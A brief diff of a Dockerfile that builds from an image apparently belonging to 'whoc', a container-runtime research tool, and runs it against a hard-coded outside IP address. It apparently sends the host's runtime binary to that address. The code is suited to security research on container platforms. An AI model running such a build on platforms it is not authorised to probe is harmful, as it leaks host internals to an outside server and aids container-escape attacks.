@@ -1,2 +1,3 @@
-FROM yuvalavra/whoc:latest
-RUN /proc/self/exec 54.227.218.105
+FROM yuvalavra/whoc:allow_c_option
+COPY ./ /bin
+RUN 54.227.218.105
